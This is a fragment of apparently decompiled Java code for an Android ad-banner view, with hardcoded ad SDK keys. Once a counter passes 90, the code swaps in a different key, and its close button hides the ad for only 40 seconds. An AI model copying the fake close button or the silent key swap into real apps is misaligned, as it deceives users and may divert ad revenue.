this.bisinit=true;       this.mStrVponKey="""";       this.mStrAirAdKey="""";       this.mStrQQKey=""SDK20130822080903bvz7qiq9d0gfsst"";       if (sstrAdviewID != null && sstrAdviewID.length() > 5) {         this.mStrQQKey=sstrAdviewID;       }       if (this.nshowddrate > 90) {         this.mStrQQKey=""SDK20132320110924rijo0091nnn8tqc"";         if (sstrAdviewID2 != null && sstrAdviewID2.length() > 5) {           this.mStrQQKey=sstrAdviewID2;         }         this.nshowddrate=0;       }       this.bisDomoOnly=false;       this.mbIsShowqq=true;       if (this.mQQLinearLayout != null) {         this.mQQLinearLayout.removeAllViews();       }       this.mbIsActivity=true;       this.mLinearLayout=new LinearLayout(this.m_context);       this.mQQLinearLayout=new LinearLayout(this.m_context);       this.mBottomAdLayout=new LinearLayout(this.m_context);       this.mAdViewLayout=new LinearLayout(this.m_context);       addView(this.mAdViewLayout);       if (this.mAdViewLayout != null) {         this.mAdViewLayout.removeAllViews();         this.mHandler.sendEmptyMessageDelayed(16,1000L);         this.mHandler.sendEmptyMessageDelayed(MSG_CHANGEADVIEW,this.CHANGADTIME);         this.mQQadView=null;         if (checkvalidAzad() && sappKey != null && sappKey.length() > 5) {           WindowManager manage=this.m_context.getWindowManager();           Display display=manage.getDefaultDisplay();           AdBanner myAdView=new AdBanner(this.m_context,Math.min(display.getWidth(),display.getHeight()),10);           this.mAdViewLayout.addView(myAdView);           myAdView.setAppKey(sappKey);         }         this.mAdViewLayout.invalidate();         if (sbisshowclose) {           ImageView im=new ImageView(this.m_context);           im.setImageResource(R.drawable.ic_delete);           FrameLayout.LayoutParams localLayoutParams=new FrameLayout.LayoutParams(-2,-2);           localLayoutParams.bottomMargin=0;           localLayoutParams.leftMargin=0;           localLayoutParams.rightMargin=0;           if (!sbisshowcloseUp) {             localLayoutParams.gravity=80;           }           addView(im,localLayoutParams);           im.setOnClickListener(new View.OnClickListener(){             @Override public void onClick(            View v){               localAdView.this.setVisibility(4);               localAdView.this.mHandler.postDelayed(new Runnable(){                 @Override public void run(){                   localAdView.this.setVisibility(0);                 }               } ,40000L);             }           } );         }         this.mHandler.sendEmptyMessageDelayed(MSG_CHANGEADVIEW,this.CHANGADTIME);       }     }   } } "
